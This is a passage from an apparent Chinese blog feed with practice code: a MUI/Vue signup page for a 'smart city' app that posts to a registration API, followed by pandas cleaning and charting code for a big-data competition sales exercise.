string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>mui<span class="token punctuation">.</span><span class="token function">openWindow</span><span class="token punctuation">(</span><span class="token string">'main.html'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>mui<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">error</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span>type<span class="token punctuation">,</span>errorThrown</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//异常处理；</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">scoped</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">*</span><span class="token punctuation">{</span><span class="token property">margin</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">body</span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> #efefef<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="注册页面signup-html"><a href="#注册页面signup-html" class="headerlink" title="注册页面signup.html"></a>注册页面signup.html</h1><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/mui.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/mui.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">      mui<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题栏（mheader） --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-bar mui-bar-nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>智慧城市<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 主体内容（mbody） --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 用户名&amp;密码输入框 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-group<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-top</span><span class="token punctuation">:</span> 5vh<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- mi --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">&gt;</span></span>账号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-clear<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入用户名<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">&gt;</span></span>密码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">&gt;</span></span>手机号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenumber<span class="token punctuation">"</span></span><span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-input-password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入手机号<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 登录 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login()<span class="token punctuation">"</span></span><span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 90vw<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span>5vh 5vw<span class="token punctuation">;</span><span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui-btn mui-btn-blue mui-btn-block<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 注册账号 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>注册账号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>|<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登录账号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 快捷登录图标 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-top</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/1.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/1.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/1.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">el</span><span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token literal-property property">phonenumber</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>mui<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token string">'http://124.93.196.45:10001/prod-api/api/register'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">userName</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">,</span><span class="token literal-property property">phonenumber</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>phonenumber<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">dataType</span><span class="token operator">:</span><span class="token string">'json'</span><span class="token punctuation">,</span><span class="token comment">//服务器返回json格式数据</span><span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'post'</span><span class="token punctuation">,</span><span class="token comment">//HTTP请求类型</span><span class="token literal-property property">timeout</span><span class="token operator">:</span><span class="token number">10000</span><span class="token punctuation">,</span><span class="token comment">//超时时间设置为10秒；</span><span class="token literal-property property">headers</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token string-property property">'Content-Type'</span><span class="token operator">:</span><span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>mui<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">error</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">xhr<span class="token punctuation">,</span>type<span class="token punctuation">,</span>errorThrown</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//异常处理；</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">scoped</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">*</span><span class="token punctuation">{</span><span class="token property">margin</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">body</span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> #efefef<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据竞赛模拟赛题3</title>
      <link href="/2023/08/24/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%8B%9F%E8%B5%9B%E9%A2%983/"/>
      <url>/2023/08/24/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%8B%9F%E8%B5%9B%E9%A2%983/</url>
      
        <content type="html"><![CDATA[<h1 id="商品销售案例"><a href="#商品销售案例" class="headerlink" title="商品销售案例"></a>商品销售案例</h1><h2 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_excel<span class="token punctuation">(</span><span class="token string">'./商品销售数据.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 清洗【用户 ID】列的缺失值</span>data <span class="token operator">=</span> data<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span>subset<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'用户 ID'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 查找重复数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>data<span class="token punctuation">.</span>duplicated<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 删除重复值</span>data <span class="token operator">=</span> data<span class="token punctuation">.</span>drop_duplicates<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 查找清洗后的数据是否存在重复数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>data<span class="token punctuation">.</span>duplicated<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 筛选【数量】列大于 0 的数据</span>data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'数量'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数据分析与图标展示"><a href="#数据分析与图标展示" class="headerlink" title="数据分析与图标展示"></a>数据分析与图标展示</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取各月总销售额</span>sales_income <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'月份'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'销售额'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 画出各月总销售额的折线图</span>sales_income<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月总销售额趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取各月总订单量</span>order_number <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'月份'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'订单量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 画出各月总订单量的折线图</span>order_number<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月总订单量趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取每月平均单价</span>month_price <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'月份'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'单价'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 画出各月平均单价的折线图</span>month_price<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'各月平均单价趋势图'</span><span class="token punctuation">)</span><span class="token comment"># 获取各月各省总订单量</span>month_order1 <span class="token operator">=</span> mask_data_clean<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'省'</span><span class="token punctuation">,</span> <span class="token string">'月份'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'订单量'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>month_order1_df <span class="token operator">=</span> month_order1<span class="token punctuation">.</span>unstack<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 根据month_order1_df绘制多条折线图，标题为'各月各省总订单量趋势图'</span>month_order1_df<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>kind <span class="token operator">=</span> <span class="token string">'line'</span><span class="token punctuation">,</span> figsize <span class="token operator">=</span> <span class="token 